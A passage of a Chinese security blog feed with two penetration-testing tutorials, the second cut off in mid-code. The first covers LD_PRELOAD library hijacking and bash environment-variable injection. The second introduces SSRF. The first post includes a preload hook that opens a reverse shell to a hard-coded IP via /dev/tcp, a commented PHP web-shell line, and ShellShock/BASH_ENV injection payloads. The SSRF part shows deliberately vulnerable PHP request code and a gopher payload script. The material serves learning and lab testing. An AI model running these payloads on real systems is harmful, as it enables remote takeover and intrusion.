        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><blockquote><p>LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p></blockquote><p>具体的操作步骤如下：</p><ol><li>定义与目标函数完全一样的函数，包括名称、变量及类型、返回值及类型等。</li><li>将包含替换函数的源码编译为动态链接库。</li><li>通过命令 <code>export LD_PRELOAD=&quot;库文件路径&quot;</code>，设置要优先替换动态链接库即可。</li><li>替换结束，要还原函数调用关系，用命令<code>unset LD_PRELOAD</code> 解除</li></ol><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><h2 id="劫持ls命令"><a href="#劫持ls命令" class="headerlink" title="劫持ls命令"></a>劫持ls命令</h2><p>查找ls命令执行时调用的系统函数，例如调用了<code>strncmp</code></p><p>payload</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strncmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *__s1, <span class="type">const</span> <span class="type">char</span> *__s2, <span class="type">size_t</span> __n)</span> &#123;    </span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里函数的定义可以根据报错信息进行确定</p><img src="E:\typora img\QQ截图20221107134218.jpg" alt="QQ截图20221107134218" style="zoom:67%;" /><p>从源码中找到的</p><img src="E:\typora img\QQ截图20221107134226.jpg" alt="QQ截图20221107134226" style="zoom: 67%;" /><p>编译形成.so文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC hook_strncmp.c -o hook_strncmp.so</span><br></pre></td></tr></table></figure><p>环境变量设置优先级</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export LD_PRELOAD=$PWD/hook_strncmp.so</span><br></pre></td></tr></table></figure><p>执行命令结果</p><p><img src="/../images/image-20221107135601599-1686813288526.png" alt="image-20221107135601599"></p><h2 id="更为简单的劫持"><a href="#更为简单的劫持" class="headerlink" title="更为简单的劫持"></a>更为简单的劫持</h2><p>GCC 有个 C 语言扩展修饰符 <strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在动态链接库中，那么<strong>一旦动态链接库被系统加载，将立即执行 _attribute((constructor)) 修饰的函数</strong>。这样，我们就不用局限于仅劫持某一函数，而应考虑劫持动态链接库了，也可以说是劫持了一个新进程。</p><ul><li><p>hook.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/120.77.73.212/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">    <span class="comment">//system(&quot;echo \&quot;&lt;?php eval(\\$_POST[cmd]);?&gt;\&quot; &gt; /var/www/html/shell.php&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编译形成.so文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC hook.c -o hook.so</span><br></pre></td></tr></table></figure></li></ul><h2 id="PHP中"><a href="#PHP中" class="headerlink" title="PHP中"></a>PHP中</h2><ul><li>RCE</li><li>绕过disable_function</li></ul><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ul><li>能够上传文件，只要是.so文件，任意后缀名都可以解析</li><li>能够设置环境变量<code>LD_PRELOAD</code></li><li>有可以启动新进程的 PHP 函数（这样才能够劫持）</li></ul><h3 id="如何找到可以启动新进程的-PHP-函数"><a href="#如何找到可以启动新进程的-PHP-函数" class="headerlink" title="如何找到可以启动新进程的 PHP 函数"></a>如何找到可以启动新进程的 PHP 函数</h3><p>查看PHP函数调用时的shell操作</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">strace -f php test.php <span class="number">2</span>&gt;&amp;<span class="number">1</span> | grep -A2 -B2 execve</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@localhost&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span>s</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221108113210633-1686813288527.png" alt="image-20221108113210633"></p><p>可以看到执行mail函数时实际是启动了一个新的进程来调用系统命令<code>sendmail</code></p><p>其他可以启动新进程的php函数</p><ul><li><code>error_log(&quot;&quot;, 1, &quot;&quot;, &quot;&quot;);</code></li><li><code>$img = new Imagick(&#39;/tmp/a5edb30f575fb2f877a19b2f62a2e720/whoami.wmv&#39;);</code></li><li><code>system</code></li><li><code>imap_mail()</code></li><li><code>mb_send_mail()</code></li></ul><h3 id="文件上传绕过disable-function"><a href="#文件上传绕过disable-function" class="headerlink" title="文件上传绕过disable_function"></a>文件上传绕过<code>disable_function</code></h3><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><h3 id="无上传文件操作–ShellShock（CVE-2014-6271）"><a href="#无上传文件操作–ShellShock（CVE-2014-6271）" class="headerlink" title="无上传文件操作–ShellShock（CVE-2014-6271）"></a>无上传文件操作–ShellShock（CVE-2014-6271）</h3><p>以下测试环境</p><p><img src="/../images/image-20221126164918984-1686813288527.png" alt="image-20221126164918984"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;envs&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$key&#125;</span>=<span class="subst">&#123;$val&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//... 一些其他代码</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo hello&#x27;</span>); <span class="comment"># 相当于sh -c echo &quot;command&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>只适用于redhat系列–centos</p><blockquote><p>redhat系列sh指向bash</p><p><img src="/../images/image-20221126161815577-1686813288527.png" alt="image-20221126161815577"></p></blockquote><blockquote><p>debian系列指向dash</p><p><img src="/../images/image-20221126163241501-1686813288527.png" alt="image-20221126163241501"></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如TEST=&#x27;() &#123; :; &#125;&#x27;; id;</span><br><span class="line"></span><br><span class="line">Bash 4.4以前：env $&#x27;BASH_FUNC_echo()=() &#123; id; &#125;&#x27; bash -c &quot;echo hello&quot;</span><br><span class="line"></span><br><span class="line">Bash 4.4及以上：env $&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;&#x27; bash -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p>本地测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># system(&#x27;echo hello&#x27;); # 相当于sh -c echo &quot;command&quot;</span></span><br><span class="line">?envs[<span class="title function_ invoke__">BASH_FUNC_echo</span>()]=() &#123; ls; &#125;</span><br></pre></td></tr></table></figure><img src="E:\typora img\image-20221126170554976.png" alt="image-20221126170554976" style="zoom:50%;" /><h4 id="其他情况下的环境变量注入payload"><a href="#其他情况下的环境变量注入payload" class="headerlink" title="其他情况下的环境变量注入payload"></a>其他情况下的环境变量注入payload</h4><h5 id="redhat"><a href="#redhat" class="headerlink" title="redhat"></a>redhat</h5><ul><li><p><code>PROMPT_COMMAND</code>：可以在<code>bash</code>交互式环境下执行任意命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PROMPT_COMMAND=&#x27;id&#x27; bash</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162222851-1686813288528.png" alt="image-20221126162222851"></p></li></ul><h5 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h5><ul><li><code>ENV</code>：可以在<code>sh -i -c</code>的时候注入任意命令</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ENV=&#x27;$(id 1&gt;&amp;2)&#x27; sh -i -c &quot;echo hello&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162443791-1686813288528.png" alt="image-20221126162443791"></p><p><img src="/../images/image-20221126162453087-1686813288528.png" alt="image-20221126162453087"></p><ul><li><p><code>BASH_ENV</code>：可以在<code>bash -c</code>的时候注入任意命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BASH_ENV=&#x27;$(id 1&gt;&amp;2)&#x27; bash -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162613165-1686813288528.png" alt="image-20221126162613165"></p></li></ul><p><img src="/../images/image-20221126162622468-1686813288528.png" alt="image-20221126162622468"></p><ul><li><p><code>PS1</code>：可以在<code>dash</code>或<code>bash</code>交互式环境下执行任意命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PS1=&#x27;$(whoami)&#x27; dash/bash</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126163037850-1686813288528.png" alt="image-20221126163037850"></p></li></ul><p><img src="/../images/image-20221126163059160-1686813288528.png" alt="image-20221126163059160"></p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;command&#x27;</span>) ----&gt;  <span class="title function_ invoke__">php_exec_ex</span>() ----&gt;   <span class="title function_ invoke__">php_exec</span>()  ---&gt;   linux popen函数  ---&gt;</span><br><span class="line">Linux glibc库    ----&gt;   sh -c <span class="keyword">echo</span> <span class="string">&quot;command&quot;</span>  </span><br></pre></td></tr></table></figure><blockquote><p>glibc是gnu发布的libc库，也即c运行库。glibc是linux 系统中最底层的api（应用程序开发接口），几乎其它任何的运行库都会倚赖于glibc。</p></blockquote><img src="E:\typora img\image-20221107153339706.png" alt="image-20221107153339706" style="zoom:67%;" /><img src="E:\typora img\image-20221107153422836.png" alt="image-20221107153422836" style="zoom:67%;" /><img src="E:\typora img\image-20221107153502513.png" alt="image-20221107153502513" style="zoom:67%;" /><img src="E:\typora img\image-20221107153708100.png" alt="image-20221107153708100" style="zoom:67%;" /><h5 id="debian系列"><a href="#debian系列" class="headerlink" title="debian系列"></a>debian系列</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c echo &quot;command&quot;  --&gt; dash -c echo &quot;command&quot;   #  在debian系列sh指向dash</span><br></pre></td></tr></table></figure><p>漏洞产生原因</p><p>在dash源码中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> linux</span></span><br><span class="line">getuid( ) == geteuid( ) &amp;&amp; getgid( ) == getegid( ) S &amp;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">iflag ）&#123;  <span class="comment">// iflag为-i参数，所以只有传入-i参数才能进入下面的if语句</span></span><br><span class="line"><span class="keyword">if</span> ((shinit = lookupvar(<span class="string">&quot;ENV&quot;</span>)) != <span class="literal">NULL</span> &amp;&amp; *shinit != <span class="string">&#x27;\0&#x27;</span>) </span><br><span class="line">    &#123;</span><br><span class="line">    read_profile(shinit);</span><br><span class="line">&#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read_profile</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">STATIC <span class="type">void</span></span><br><span class="line"><span class="title function_">read_profile</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// expandstr可以解析shell命令，解析的name参数就是环境变量ENV</span></span><br><span class="line">    name = expandstr(name);</span><br><span class="line">    <span class="keyword">if</span> (setinputfile(name, INPUT_PUSH_FILE | INPUT_NOFILE_OK) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    cmdloop(<span class="number">0</span>);</span><br><span class="line">    popfile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ENV=&#x27;$(id 1&gt;&amp;2)&#x27; dash -i -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107152419461-1686813288528.png" alt="image-20221107152419461"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.anquanke.com/post/id/254388#h3-6">https://www.anquanke.com/post/id/254388#h3-6</a></p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2023/05/31/Web%E5%AE%89%E5%85%A8%E4%B9%8BSSRF/"/>
      <url>/2023/05/31/Web%E5%AE%89%E5%85%A8%E4%B9%8BSSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><code>SSRF</code>（Server-Side Request Forgery，服务器端请求伪造）是一种<strong>由攻击者构造请求，利用服务器端发起请求</strong>的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）。</p><p>​ </p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>目标服务器会从自身发起请求，并且该请求可控以及没有对请求地址进行过滤和限制。</p><h1 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h1><ul><li><p>请求外部资源，如导入文件，加载远程图片，RSS订阅等</p></li><li><p>数据库内置的加载外部URL功能</p></li><li><p>Webmail收取其他邮箱邮件，如POP3,IMAP,SMTP等</p></li><li><p>文件处理，编码处理，属性信息处理，如FFmpeg，ImageMagic,Word,Excel,PDF,XML等</p><p><a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0205699">56视频FFmpeg解析漏洞导致SSRF | wooyun-2016-0205699| WooYun.org</a></p></li></ul><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><ul><li>读取文件</li><li>内网探针，获取内网结构和内网机器指纹</li><li>若内网主机存在漏洞，可以使用gopher协议构造数据包对其发起攻击</li></ul><p>From 国光师傅的ssrf靶场拓扑图</p><p><img src="/../images/16205694239190.png" alt="img"></p><blockquote><p>172.72.23.21 这个服务器的 Web 80 端口存在 SSRF 漏洞，并且 80 端口映射到了公网的 8080，此时攻击者通过这个 8080 端口可以借助 SSRF 漏洞发起对 172 目标内网的探测和攻击。</p></blockquote><h1 id="产生漏洞的函数"><a href="#产生漏洞的函数" class="headerlink" title="产生漏洞的函数"></a>产生漏洞的函数</h1><ul><li><p><code>file_get_contents</code></p><blockquote><p>将整个文件读入一个字符串</p><p>支持本地文件和远程文件</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804190900308.png" alt="image-20220804190900308"></p></li><li><p><code>curl_exec()</code></p><blockquote><p>执行给定的 curl 会话。</p><p><a href="https://stackoverflow.com/questions/6382539/call-to-undefined-function-curl-init">Call to undefined function curl_init()错误解决</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804191212091.png" alt="image-20220804191212091"></p></li><li><p><code>fsockopen</code></p><blockquote><p>使用socket跟服务器建立tcp连接，传输原始数据。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$data</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//$fp:TCP连接  $data:请求头</span></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="title function_ invoke__">base6e_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="comment">//执行http请求，并获得返回值</span></span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">GetFile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?host=<span class="number">127.0</span>.<span class="number">0.1</span>&amp;port=<span class="number">80</span>&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo</span><br><span class="line"></span><br><span class="line">data--&gt;</span><br><span class="line">GET /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Connection: Close</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804191713087.png" alt="image-20220804191713087"></p></li></ul><h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><p>检测到存在SSRF漏洞后</p><ul><li>探测主机存活情况</li><li>探测存活主机端口情况</li><li>根据端口情况尝试攻击</li></ul><p><strong>注意点</strong></p><p>攻击的数据需要经过两次URL编码，因为数据是先到达有SSRF漏洞的主机，再通过SSRF漏洞转交给内网其他主机处理。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="常用协议介绍"><a href="#常用协议介绍" class="headerlink" title="常用协议介绍"></a>常用协议介绍</h2><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><blockquote><p><strong>cURL</strong>是一个利用URL语法在命令行下工作的文件传输工具。</p><p>它的名字就是客户端（client）的 URL 工具的意思。</p></blockquote><p><code>curl -v www.baidu.com</code></p><p>-v：显示请求头和响应头</p><p><img src="/../images/image-20220805214719676.png" alt="image-20220805214719676"></p><p><code>curl -V</code></p><p><img src="/../images/image-20220804184555137.png" alt="image-20220804184555137"></p><p>可以看到支持的协议如下</p><table><thead><tr><th><strong>dict</strong></th><th><strong>file</strong></th><th><strong>ftp</strong></th><th><strong>pop3</strong></th><th><strong>pop3s</strong></th></tr></thead><tbody><tr><td><strong>ftos</strong></td><td><strong>gopher</strong></td><td><strong>gophers</strong></td><td><strong>rtmp</strong></td><td><strong>rtsp</strong></td></tr><tr><td><strong>http</strong></td><td><strong>https</strong></td><td><strong>imap</strong></td><td><strong>scp</strong></td><td><strong>sftp</strong></td></tr><tr><td><strong>imaps</strong></td><td><strong>ldap</strong></td><td><strong>ldaps</strong></td><td><strong>smb</strong></td><td><strong>smbs</strong></td></tr><tr><td><strong>smtp</strong></td><td><strong>smtps</strong></td><td><strong>telnet</strong></td><td><strong>tftp</strong></td><td><strong>mtt</strong></td></tr></tbody></table><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><blockquote><p>gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http 协议的前身或简化版，支持发出GET、POST请求，可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。</p></blockquote><p><img src="/../images/v2-ea9bb9538044933ac3c918d5a56f2d69_720w.jpg" alt="img"></p><ul><li>坑点</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl gopher://localhost:2222/khaz%0atest%0ahaha </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ nc -lvp 2222</span><br><span class="line">listening on [any] 2222 ...</span><br><span class="line">connect to [127.0.0.1] from localhost [127.0.0.1] 50546</span><br><span class="line">haz</span><br><span class="line">test</span><br><span class="line">haha</span><br></pre></td></tr></table></figure><p>会发现接收到的消息是分行的，而且第一行只接收到了haz，k被‘吃掉’了。</p><p>所以在使用gopher协议时<strong>需要在url后加入一个任意字符</strong>才行。</p><ul><li><p>get&#x2F;post请求</p><blockquote><p>1、构造HTTP数据包</p><p>2、URL编码、替换回车换行为%0d%0a,<br>3、发送gopher协议</p></blockquote><p>注意HTTP数据包中必须要有下面四个请求头</p></li></ul><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">Host: 192.168.244.128</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">  </span><br><span class="line">a=khaz</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#转换脚本</span></span><br><span class="line">uri = <span class="string">&#x27;/flag.php&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;127.0.0.1:80&#x27;</span></span><br><span class="line">content = <span class="string">&#x27;key=90bb4d9d9946905d6d9d68358d7c0360&#x27;</span></span><br><span class="line">content_length = <span class="built_in">len</span>(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test =<span class="string">f&quot;&quot;&quot;POST <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">  Host: <span class="subst">&#123;host&#125;</span></span></span><br><span class="line"><span class="string">  Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">  Content-Length: <span class="subst">&#123;content_length&#125;</span></span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  <span class="subst">&#123;content&#125;</span>&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">first = urllib.parse.quote(test)<span class="comment">#url编码</span></span><br><span class="line"></span><br><span class="line">second = first.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)<span class="comment"># \n → \r\n</span></span><br><span class="line"></span><br><span class="line">third = urllib.parse.quote(second)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;gopher://&#123;&#125;/_&#x27;</span>.<span class="built_in">format</span>(host)+third+<span class="string">&quot;%0D%0A&quot;</span> <span class="comment">#gopher协议会吃掉url后面的第一个字符</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>  例子</p><ul><li>通过命令发起</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.php kali</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gopher:<span class="comment">//192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A</span></span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20220805001153033.png" alt="image-20220805001153033"></p><ul><li><p>通过curl函数发起–两次url编码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ssrf.php  windows</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="comment">//创建一个新的curl资源  </span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();  </span><br><span class="line">    <span class="comment">//设置URL和相应的选项  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);  </span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="literal">false</span>);  </span><br><span class="line">    <span class="comment">//抓取URL并把它传递给浏览器  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);  </span><br><span class="line">    <span class="comment">//关闭curl资源，并且释放系统资源  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span 